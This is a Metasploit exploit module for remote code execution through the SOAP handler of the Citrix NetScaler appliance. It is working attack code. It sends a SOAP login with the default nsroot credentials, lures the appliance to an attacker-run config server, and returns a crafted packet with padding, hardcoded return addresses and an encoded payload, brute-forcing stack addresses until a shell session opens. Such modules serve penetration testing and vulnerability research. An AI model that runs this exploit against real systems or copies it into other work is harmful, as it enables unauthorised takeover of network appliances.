# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Brute

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Citrix NetScaler SOAP Handler Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a memory corruption vulnerability on the Citrix NetScaler Appliance.
        The vulnerability exists in the SOAP handler, accessible through the web interface. A
        malicious SOAP requests can force the handler to connect to a malicious NetScaler config
        server. This malicious config server can send a specially crafted response in order to
        trigger a memory corruption and overwrite data in the stack, to finally execute arbitrary
        code with the privileges of the web server running the SOAP handler. This module has been
        tested successfully on the NetScaler Virtual Appliance 450010.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Bradley Austin&#039;, # Vulnerability Discovery and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.html&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;          => 1024,
          &#039;MinNops&#039;        => 512,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;bsd&#039;,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;        =>
        [
          [ &#039;NetScaler Virtual Appliance 450010&#039;,
            {
              &#039;RwPtr&#039;        => 0x80b9000, # apache2 rw address / Since this target is a virtual appliance, has sense.
              &#039;Offset&#039;       => 606,
              &#039;Ret&#039;          => 0xffffda94, # Try before bruteforce...
              # The virtual appliance lacks of security mitigations like DEP/ASLR, since the
              # process being exploited is an apache child, the bruteforce attack works fine
              # here.
              &#039;Bruteforce&#039;   =>
                {
                  &#039;Start&#039; => { &#039;Ret&#039; => 0xffffec00 }, # bottom of the stack
                  &#039;Stop&#039;  => { &#039;Ret&#039; => 0xfffdf000 }, # top of the stack
                  &#039;Step&#039;  => 256
                }
            }
          ],
        ],
      &#039;DisclosureDate&#039; => "Sep 22 2014",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the soap handler&#039;, &#039;/soap&#039;]),
        OptAddress.new(&#039;SRVHOST&#039;, [true, "The local host to listen on. This must be an address on the local machine reachable by the target", ]),
        OptPort.new(&#039;SRVPORT&#039;, [true,  "The local port to listen on.", 3010])
      ], self.class)
  end


  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path)
    })

    if res && res.code == 200 && res.body && res.body =~ /Server Request Handler.*No body received/m
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    if [&#039;0.0.0.0&#039;, &#039;127.0.0.1&#039;].include?(datastore[&#039;SRVHOST&#039;])
      fail_with(Failure::BadConfig, &#039;Bad SRVHOST, use an address on the local machine reachable by the target&#039;)
    end

    if check != Exploit::CheckCode::Detected
      fail_with(Failure::NoTarget, "#{peer} - SOAP endpoint not found")
    end

    start_service

    if target.ret
      @curr_ret = target.ret
      send_request_soap
      Rex.sleep(3)

      if session_created?
        return
      end
    end

    super
  end

  def brute_exploit(addrs)
    @curr_ret = addrs[&#039;Ret&#039;]
    send_request_soap
  end

  def send_request_soap
    soap = <<-EOS
<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<ns7744:login xmlns:ns7744="urn:NSConfig">
<username xsi:type="xsd:string">nsroot</username>
<password xsi:type="xsd:string">nsroot</password>
<clientip xsi:type="xsd:string">#{datastore[&#039;SRVHOST&#039;]}</clientip>
<cookieTimeout xsi:type="xsd:int">1800</cookieTimeout>
<ns xsi:type="xsd:string">#{datastore[&#039;SRVHOST&#039;]}</ns>
</ns7744:login>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
    EOS

    print_status("#{peer} - Sending soap request...")

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path),
      &#039;data&#039;   => soap
    }, 1)
  end

  def on_client_data(c)
    print_status("#{c.peerhost} - Getting request...")

    data = c.get_once(2)
    req_length = data.unpack("v")[0]

    req_data = c.get_once(req_length - 2)
    unless req_data.unpack("V")[0] == 0xa5a50000
      print_error("#{c.peerhost} - Incorrect request... sending payload anyway")
    end

    print_status("#{c.peerhost} - Sending #{payload.encoded.length} bytes payload with ret 0x#{@curr_ret.to_s(16)}...")

    my_payload = Rex::Text.pattern_create(target[&#039;Offset&#039;])
    my_payload << [@curr_ret, target[&#039;RwPtr&#039;]].pack("V*")
    my_payload << payload.encoded

    pkt = [my_payload.length + 6].pack("v")
    pkt << "\x00\x00\xa5\xa5"
    pkt << my_payload
    c.put(pkt)
    c.disconnect
  end

end

